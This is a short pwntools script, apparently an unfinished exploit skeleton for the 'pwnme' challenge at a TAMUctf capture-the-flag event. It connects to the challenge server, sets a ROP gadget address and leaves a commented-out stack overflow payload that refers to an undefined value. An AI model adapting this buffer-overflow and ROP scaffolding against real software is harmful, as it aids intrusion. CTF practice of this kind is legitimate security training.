#!/usr/bin/python3

from pwn import *

exe = ELF('pwnme', checksec=False)
libc = ELF('libpwnme.so')
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote("tamuctf.com", 443, ssl=True, sni="pwnme")
else:
        p = process(exe.path)

GDB()
pop_rdi = 0x000000000040118b


# payload = b"a" * 24 
# payload += p64(pop_rdi) + p64(ex)
p.interactive()
